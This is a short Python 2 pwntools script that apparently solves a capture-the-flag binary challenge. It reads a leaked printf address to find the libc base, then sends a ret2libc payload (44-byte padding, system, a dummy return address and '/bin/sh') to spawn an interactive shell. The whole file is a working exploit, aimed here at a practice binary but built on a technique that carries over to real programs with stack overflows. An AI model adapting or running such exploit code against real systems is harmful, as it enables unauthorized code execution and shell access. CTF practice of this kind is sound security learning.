#!/usr/bin/env python2
from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')
local = True

if local:
    conn = elf.process() # to interact with the chall elf
else :
    host = '????'
    port = '????'
    conn = remote(host,port)  # to connect to the ctf server 

conn.recvuntil("Some help: ")
printf = conn.recvline().strip()
libc.address = int(printf,16) - libc.symbols['printf']

padding = "A"*44
system = libc.symbols["system"]
ret_add = "AAAA"
bin_sh = libc.search("/bin/sh").next()

payload = flat(padding , system , ret_add , bin_sh)
#print(payload)
conn.sendline(payload)
conn.interactive()


conn.close()
